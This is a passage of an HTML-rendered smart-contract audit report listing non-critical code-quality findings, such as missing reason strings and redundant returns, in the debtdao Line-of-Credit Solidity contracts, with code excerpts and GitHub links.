align=\"center\">1</td>\n</tr>\n<tr>\n<td>[N‑04]</td>\n<td align=\"left\">Adding a <code>return</code> statement when the function defines a named return variable, is redundant</td>\n<td align=\"center\">5</td>\n</tr>\n<tr>\n<td>[N‑05]</td>\n<td align=\"left\"><code>require()</code>/<code>revert()</code> statements should have descriptive reason strings</td>\n<td align=\"center\">23</td>\n</tr>\n<tr>\n<td>[N‑06]</td>\n<td align=\"left\"><code>constant</code>s should be defined rather than using magic numbers</td>\n<td align=\"center\">7</td>\n</tr>\n<tr>\n<td>[N‑07]</td>\n<td align=\"left\">Numeric values having to do with time should use time units for readability</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[N‑08]</td>\n<td align=\"left\">Use a more recent version of solidity</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[N‑09]</td>\n<td align=\"left\">Use a more recent version of solidity</td>\n<td align=\"center\">6</td>\n</tr>\n<tr>\n<td>[N‑10]</td>\n<td align=\"left\">Use scientific notation (e.g. <code>1e18</code>) rather than exponentiation (e.g. <code>10**18</code>)</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[N‑11]</td>\n<td align=\"left\">Constant redefined elsewhere</td>\n<td align=\"center\">5</td>\n</tr>\n<tr>\n<td>[N‑12]</td>\n<td align=\"left\">Inconsistent spacing in comments</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td>[N‑13]</td>\n<td align=\"left\">Non-library/interface files should use fixed compiler versions, not floating ones</td>\n<td align=\"center\">5</td>\n</tr>\n<tr>\n<td>[N‑14]</td>\n<td align=\"left\">File does not contain an SPDX Identifier</td>\n<td align=\"center\">16</td>\n</tr>\n<tr>\n<td>[N‑15]</td>\n<td align=\"left\">NatSpec is incomplete</td>\n<td align=\"center\">56</td>\n</tr>\n<tr>\n<td>[N‑16]</td>\n<td align=\"left\">Event is missing <code>indexed</code> fields</td>\n<td align=\"center\">4</td>\n</tr>\n<tr>\n<td>[N‑17]</td>\n<td align=\"left\">Not using the named return variables anywhere in the function is confusing</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td>[N‑18]</td>\n<td align=\"left\">Duplicated <code>require()</code>/<code>revert()</code> checks should be refactored to a modifier or function</td>\n<td align=\"center\">2</td>\n</tr>\n</tbody>\n</table>\n<p>Total: 140 instances over 18 issues</p>\n<h2 id=\"n01--duplicate-import-statements\" style=\"position:relative;\"><a href=\"#n01--duplicate-import-statements\" aria-label=\"n01  duplicate import statements permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑01]  Duplicate import statements</h2>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CreditLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">6</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">ILineOfCredit</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../interfaces/ILineOfCredit.sol&quot;</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L6\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L6</a></p>\n<h2 id=\"n02--the-nonreentrant-modifier-should-occur-before-all-other-modifiers\" style=\"position:relative;\"><a href=\"#n02--the-nonreentrant-modifier-should-occur-before-all-other-modifiers\" aria-label=\"n02  the nonreentrant modifier should occur before all other modifiers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑02]  The <code>nonReentrant</code> <code>modifier</code> should occur before all other modifiers</h2>\n<p>This is a best-practice to protect against reentrancy in other modifiers.</p>\n<p><em>There are 2 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotedLine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">96</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">nonReentrant</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">157</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">nonReentrant</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L96\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L96</a></p>\n<h2 id=\"n03--contract-implements-interface-without-extending-the-interface\" style=\"position:relative;\"><a href=\"#n03--contract-implements-interface-without-extending-the-interface\" aria-label=\"n03  contract implements interface without extending the interface permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑03]  Contract implements interface without extending the interface</h2>\n<p>Not extending the interface may lead to the wrong function signature being used, leading to unexpected behavior. If the interface is in fact being implemented, use the <code>override</code> keyword to indicate that fact.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">spigot</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Spigot</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit IPendleData.treasury()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">16</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Spigot</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ISpigot</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ReentrancyGuard</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L16\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L16</a></p>\n<h2 id=\"n04--adding-a-return-statement-when-the-function-defines-a-named-return-variable-is-redundant\" style=\"position:relative;\"><a href=\"#n04--adding-a-return-statement-when-the-function-defines-a-named-return-variable-is-redundant\" aria-label=\"n04  adding a return statement when the function defines a named return variable is redundant permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑04]  Adding a <code>return</code> statement when the function defines a named return variable, is redundant</h2>\n<p><em>There are 5 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineOfCredit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">453</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L453\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L453</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CreditLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">160</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L160\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L160</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">57</span><span class=\"mtk1\">:           </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">claimed</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">101</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">claimed</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">121</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">claimed</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L57\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L57</a></p>\n<h2 id=\"n05--requirerevert-statements-should-have-descriptive-reason-strings\" style=\"position:relative;\"><a href=\"#n05--requirerevert-statements-should-have-descriptive-reason-strings\" aria-label=\"n05  requirerevert statements should have descriptive reason strings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑05]  <code>require()</code>/<code>revert()</code> statements should have descriptive reason strings</h2>\n<p><em>There are 23 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EscrowedLine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">64</span><span class=\"mtk1\">:       </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">escrow_</span><span class=\"mtk1\">.</span><span class=\"mtk11\">liquidate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">targetToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">90</span><span class=\"mtk1\">:       </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">escrow</span><span class=\"mtk1\">.</span><span class=\"mtk11\">updateLine</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newLine</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/EscrowedLine.sol#L64\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/EscrowedLine.sol#L64</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineOfCredit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">112</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">status</span><span class=\"mtk1\">) &gt;= </span><span class=\"mtk11\">uint</span><span class=\"mtk1\">( </span><span class=\"mtk12\">LineLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">STATUS</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ACTIVE</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">241</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">interestRate</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">drate</span><span class=\"mtk1\">, </span><span class=\"mtk12\">frate</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">259</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">interestRate</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">drate</span><span class=\"mtk1\">, </span><span class=\"mtk12\">frate</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">326</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">principal</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">interestAccrued</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L112\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L112</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotedLine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">62</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">defaultRevenueSplit_</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">SpigotedLineLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MAX_SPLIT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">143</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">unusedTokens</span><span class=\"mtk1\">[</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">token</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">160</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">239</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">arbiter</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L62\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L62</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EscrowLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">91</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">105</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">ILineOfCredit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">self</span><span class=\"mtk1\">.</span><span class=\"mtk12\">line</span><span class=\"mtk1\">).</span><span class=\"mtk11\">arbiter</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">161</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">198</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">216</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">self</span><span class=\"mtk1\">.</span><span class=\"mtk12\">line</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L91\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L91</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotedLineLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">147</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">ISpigot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">spigot</span><span class=\"mtk1\">).</span><span class=\"mtk11\">updateOwner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newLine</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L147\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L147</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">96</span><span class=\"mtk1\">:               </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LineLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sendOutTokenOrETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">self</span><span class=\"mtk1\">.</span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">, </span><span class=\"mtk12\">claimed</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">escrowedAmount</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">128</span><span 